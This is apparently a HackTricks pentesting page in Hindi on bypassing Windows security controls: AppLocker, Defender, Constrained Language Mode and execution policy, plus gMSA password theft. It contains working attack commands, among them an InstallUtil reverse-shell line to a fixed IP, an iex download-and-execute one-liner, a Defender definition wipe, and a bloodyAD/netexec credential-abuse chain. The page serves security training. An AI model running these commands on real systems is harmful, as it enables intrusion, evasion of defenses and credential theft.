# Windows Security Controls

{{#include ../../banners/hacktricks-training.md}}

## AppLocker Policy

An application whitelist स्वीकृत software applications या executables की एक सूची होती है, जिन्हें किसी system पर मौजूद रहने और चलने की अनुमति होती है। इसका उद्देश्य environment को हानिकारक malware और ऐसे unapproved software से सुरक्षित रखना है, जो किसी organization की विशिष्ट business needs के अनुरूप नहीं होते।

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) Microsoft का **application whitelisting solution** है और system administrators को इस बात पर control देता है कि **users किन applications और files को चला सकते हैं**। यह executables, scripts, Windows installer files, DLLs, packaged apps और packed app installers पर **granular control** प्रदान करता है।\
Organizations के लिए **cmd.exe और PowerShell.exe को block करना** और कुछ directories में write access को रोकना आम है, **लेकिन इन सभी controls को bypass किया जा सकता है**।

### जांच

देखें कि कौन-सी files/extensions blacklisted/whitelisted हैं:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
यह registry path AppLocker द्वारा लागू किए गए configurations और policies को रखता है, जिससे system पर लागू वर्तमान rules की समीक्षा करने का तरीका मिलता है:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- AppLocker Policy को bypass करने के लिए उपयोगी **Writable folders**: यदि AppLocker `C:\Windows\System32` या `C:\Windows` के अंदर किसी भी चीज़ को execute करने की अनुमति दे रहा है, तो ऐसे **writable folders** उपलब्ध हैं जिनका उपयोग आप **इसे bypass करने** के लिए कर सकते हैं।
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- आमतौर पर **trusted** [**"LOLBAS's"**](https://lolbas-project.github.io/) binaries AppLocker को bypass करने के लिए भी उपयोगी हो सकती हैं।
- **गलत तरीके से लिखे गए rules को भी bypass किया जा सकता है**
- उदाहरण के लिए, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`** के मामले में, आप कहीं भी **`allowed` नाम का folder** बना सकते हैं और उसे अनुमति मिल जाएगी।
- Organizations अक्सर **`%System32%\WindowsPowerShell\v1.0\powershell.exe` executable को block करने** पर ध्यान केंद्रित करती हैं, लेकिन अन्य [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) को भूल जाती हैं, जैसे `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` या `PowerShell_ISE.exe`।
- **DLL enforcement बहुत कम ही enabled होता है**, क्योंकि इससे system पर अतिरिक्त load पड़ सकता है और यह सुनिश्चित करने के लिए बहुत testing की आवश्यकता होती है कि कुछ भी break न हो। इसलिए **DLLs को backdoors के रूप में उपयोग करने से AppLocker bypass करने में मदद मिलेगी**।
- आप [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) या [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) का उपयोग **किसी भी process में Powershell code execute** करने और AppLocker bypass करने के लिए कर सकते हैं। अधिक जानकारी के लिए देखें: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)।<sup>[[4]](#references)</sup>

## Credentials Storage

### Security Accounts Manager (SAM)

Local credentials इस file में मौजूद होते हैं, passwords hashed होते हैं।

### Local Security Authority (LSA) - LSASS

**Single Sign-On** के कारण इस subsystem की **memory** में **credentials** (hashed) **save** रहते हैं।\
**LSA** local **security policy** (password policy, users permissions...), **authentication**, **access tokens**... को administrate करता है।\
LSA ही **SAM** file में दिए गए credentials को **check** करेगा (local login के लिए) और domain user को authenticate करने के लिए **domain controller** से **talk** करेगा।

**Credentials** **process LSASS** के अंदर **save** रहते हैं: Kerberos tickets, NT और LM hashes, आसानी से decrypted passwords।

### LSA secrets

LSA कुछ credentials को disk पर save कर सकता है:

- Active Directory के computer account का password (unreachable domain controller)।
- Windows services के accounts के passwords
- scheduled tasks के passwords
- अन्य (IIS applications का password...)

### NTDS.dit

यह Active Directory का database है। यह केवल Domain Controllers में मौजूद होता है।

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) एक Antivirus है जो Windows 10 और Windows 11 तथा Windows Server के versions में उपलब्ध है। यह **`WinPEAS`** जैसे common pentesting tools को **block** करता है। हालांकि, इन **protections को bypass करने के तरीके** मौजूद हैं।

### Check

**Defender** का **status** check करने के लिए आप PS cmdlet **`Get-MpComputerStatus`** execute कर सकते हैं (active है या नहीं जानने के लिए **`RealTimeProtectionEnabled`** की value check करें):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

इसे enumerate करने के लिए आप यह भी run कर सकते हैं:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS फाइलों को encryption के माध्यम से सुरक्षित करता है और इसके लिए **symmetric key** का उपयोग करता है, जिसे **File Encryption Key (FEK)** कहा जाता है। यह key user की **public key** से encrypted होती है और encrypted file के $EFS **alternative data stream** में stored रहती है। जब decryption की आवश्यकता होती है, तो user के digital certificate की संबंधित **private key** का उपयोग $EFS stream से FEK को decrypt करने के लिए किया जाता है। अधिक जानकारी [यहां](https://en.wikipedia.org/wiki/Encrypting_File_System) मिल सकती है।

**User की पहल के बिना होने वाले decryption scenarios** में शामिल हैं:

- जब files या folders को किसी non-EFS file system, जैसे [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), में move किया जाता है, तो वे automatically decrypted हो जाती हैं।
- SMB/CIFS protocol के माध्यम से network पर भेजी जाने वाली encrypted files को transmission से पहले decrypt किया जाता है।

यह encryption method owner को encrypted files तक **transparent access** प्रदान करता है। हालांकि, केवल owner का password बदलकर login करने से decryption की अनुमति नहीं मिलेगी।

**मुख्य बातें**:

- EFS एक symmetric FEK का उपयोग करता है, जो user की public key से encrypted होती है।
- FEK तक पहुंचने के लिए decryption में user की private key का उपयोग किया जाता है।
- कुछ specific conditions में automatic decryption होता है, जैसे FAT32 में copy करने या network transmission के दौरान।
- Owner encrypted files को बिना किसी अतिरिक्त step के access कर सकता है।

### EFS info check करना

Check करें कि किसी **user** ने इस **service** का **उपयोग किया है या नहीं**, इसके लिए यह path मौजूद है या नहीं देखें:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

यह check करने के लिए कि file तक **किसके पास** **access** है, cipher /c \<file>\ का उपयोग करें\
किसी folder के अंदर सभी files को **encrypt** और **decrypt** करने के लिए `cipher /e` और `cipher /d` का भी उपयोग कर सकते हैं

### EFS files को decrypt करना

#### Authority System होना

इस तरीके के लिए आवश्यक है कि **victim user** host के अंदर कोई **process** **run** कर रहा हो। यदि ऐसा है, तो `meterpreter` session का उपयोग करके user के process के token को impersonate कर सकते हैं (`incognito` से `impersonate_token`)। या आप केवल user के process में `migrate` कर सकते हैं।

#### Users का password पता होना


{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft ने IT infrastructures में service accounts के management को सरल बनाने के लिए **Group Managed Service Accounts (gMSA)** विकसित किए। Traditional service accounts के विपरीत, जिनमें अक्सर "**Password never expire**" setting enabled होती है, gMSA अधिक secure और manageable solution प्रदान करते हैं:

- **Automatic Password Management**: gMSA एक complex, 240-character password का उपयोग करते हैं, जो domain या computer policy के अनुसार automatically बदलता है। यह process Microsoft की Key Distribution Service (KDC) द्वारा handle किया जाता है, जिससे manual password updates की आवश्यकता समाप्त हो जाती है।
- **Enhanced Security**: ये accounts lockouts से सुरक्षित होते हैं और interactive logins के लिए उपयोग नहीं किए जा सकते, जिससे इनकी security बढ़ जाती है।
- **Multiple Host Support**: gMSA को multiple hosts के बीच share किया जा सकता है, जिससे ये multiple servers पर चलने वाली services के लिए ideal होते हैं।
- **Scheduled Task Capability**: managed service accounts के विपरीत, gMSA scheduled tasks run करने का support करते हैं।
- **Simplified SPN Management**: computer के sAMaccount details या DNS name में changes होने पर system automatically Service Principal Name (SPN) को update करता है, जिससे SPN management सरल हो जाता है।

gMSA के passwords LDAP property _**msDS-ManagedPassword**_ में stored होते हैं और Domain Controllers (DCs) द्वारा हर 30 दिन में automatically reset किए जाते हैं। यह password, [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) के रूप में जाना जाने वाला एक encrypted data blob है, जिसे केवल authorized administrators और उन servers द्वारा retrieve किया जा सकता है जिन पर gMSA installed हैं, जिससे secure environment सुनिश्चित होता है। इस information तक access करने के लिए LDAPS जैसे secured connection की आवश्यकता होती है, या connection को 'Sealing & Secure' के साथ authenticated होना चाहिए।

![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)

आप [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**<sup>[[2]](#references)</sup> का उपयोग करके यह password read कर सकते हैं।
```
/GMSAPasswordReader --AccountName jkohler
```
[**इस पोस्ट में अधिक जानकारी पाएं**](https://cube0x0.github.io/Relaying-for-gMSA/)

साथ ही, **gMSA** का **password** **read** करने के लिए **NTLM relay attack** कैसे किया जाता है, इसकी जानकारी के लिए यह [web page](https://cube0x0.github.io/Relaying-for-gMSA/) देखें।<sup>[[1]](#references)</sup>

### gMSA managed password पढ़ने के लिए ACL chaining का दुरुपयोग (GenericAll -> ReadGMSAPassword)

कई environments में, misconfigured object ACLs का दुरुपयोग करके low-privileged users बिना DC compromise के gMSA secrets तक pivot कर सकते हैं:<sup>[[3]](#references)</sup>

- आपके control में मौजूद किसी group (जैसे GenericAll/GenericWrite के माध्यम से) को किसी gMSA पर `ReadGMSAPassword` दिया गया हो।
- स्वयं को उस group में जोड़कर, आप LDAP के माध्यम से gMSA के `msDS-ManagedPassword` blob को read करने का अधिकार प्राप्त करते हैं और उपयोग योग्य NTLM credentials प्राप्त करते हैं।

Typical workflow:

1) BloodHound से path discover करें और अपने foothold principals को Owned के रूप में mark करें। इन जैसे edges देखें:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) अपने control वाले intermediate group में स्वयं को जोड़ें (bloodyAD के उदाहरण के साथ):
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) LDAP के माध्यम से gMSA managed password पढ़ें और NTLM hash derive करें। NetExec `msDS-ManagedPassword` की extraction और NTLM में conversion को automate करता है:
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) NTLM hash का उपयोग करके gMSA के रूप में Authenticate करें (plaintext की आवश्यकता नहीं है)। यदि account Remote Management Users में है, तो WinRM सीधे काम करेगा:
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
नोट्स:
- `msDS-ManagedPassword` के LDAP reads के लिए sealing आवश्यक है (जैसे LDAPS/sign+seal)। Tools इसे अपने-आप संभालते हैं।
- gMSAs को अक्सर WinRM जैसे local rights दिए जाते हैं; lateral movement की योजना बनाने के लिए group membership (जैसे Remote Management Users) को validate करें।
- यदि आपको केवल blob चाहिए ताकि NTLM की गणना स्वयं कर सकें, तो MSDS-MANAGEDPASSWORD_BLOB structure देखें।



## LAPS

[Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899) से download के लिए उपलब्ध **Local Administrator Password Solution (LAPS)**, local Administrator passwords के management को सक्षम करता है। ये passwords **randomized**, unique और **नियमित रूप से बदले** जाते हैं तथा Active Directory में centrally store किए जाते हैं। इन passwords का access ACLs के माध्यम से authorized users तक restricted होता है। पर्याप्त permissions मिलने पर local admin passwords को read करने की ability मिल जाती है।


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) PowerShell को effectively use करने के लिए आवश्यक कई features को **lock down करता है**, जैसे COM objects को block करना, केवल approved .NET types की अनुमति देना, XAML-based workflows, PowerShell classes और अन्य features।

### **जाँचें**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
वर्तमान Windows में वह Bypass काम नहीं करेगा, लेकिन आप [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) का उपयोग कर सकते हैं।\
**इसे compile करने के लिए आपको संभवतः** **to** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` जोड़ना होगा और **प्रोजेक्ट को .Net4.5 में बदलना होगा**।

#### Direct bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
आप किसी भी process में **Powershell** code **execute** करने और constrained mode को bypass करने के लिए [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) या [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) का उपयोग कर सकते हैं। अधिक जानकारी के लिए देखें: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)।<sup>[[4]](#references)</sup>

## PS Execution Policy

डिफ़ॉल्ट रूप से यह **restricted.** पर सेट होती है। इस policy को bypass करने के मुख्य तरीके:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
More can be found [यहाँ](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[5]](#references)</sup>

## Security Support Provider Interface (SSPI)

यह users को authenticate करने के लिए उपयोग की जाने वाली API है।

SSPI उन दो machines के लिए उपयुक्त protocol खोजने का कार्य करता है, जो communicate करना चाहती हैं। इसके लिए preferred method Kerberos है। इसके बाद SSPI यह negotiate करेगा कि कौन-सा authentication protocol उपयोग किया जाएगा। इन authentication protocols को Security Support Provider (SSP) कहा जाता है। ये प्रत्येक Windows machine के अंदर DLL के रूप में स्थित होते हैं और communicate करने में सक्षम होने के लिए दोनों machines को समान SSP support करना चाहिए।

### Main SSPs

- **Kerberos**: Preferred विकल्प
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** और **NTLMv2**: Compatibility reasons
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web servers और LDAP, password MD5 hash के रूप में
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL और TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: उपयोग किए जाने वाले protocol को negotiate करने के लिए उपयोग किया जाता है (Kerberos या NTLM, जिसमें Kerberos default है)
- %windir%\Windows\System32\lsasrv.dll

#### Negotiation कई methods या केवल एक method offer कर सकता है।

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) एक feature है, जो **elevated activities के लिए consent prompt** enable करता है।


{{#ref}}
uac-user-account-control.md
{{#endref}}

## References

- [1] [Relaying for gMSA – cube0x0](https://cube0x0.github.io/Relaying-for-gMSA/)
- [2] [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [3] [HTB Sendai – 0xdf: gMSA via rights chaining to WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [4] [darthsidious – Bypassing AppLocker and PowerShell Constrained Language Mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)
- [5] [NetSPI – 15 Ways to Bypass the PowerShell Execution Policy](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [6] [howto ~ decrypt EFS files](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)

{{#include ../../banners/hacktricks-training.md}}
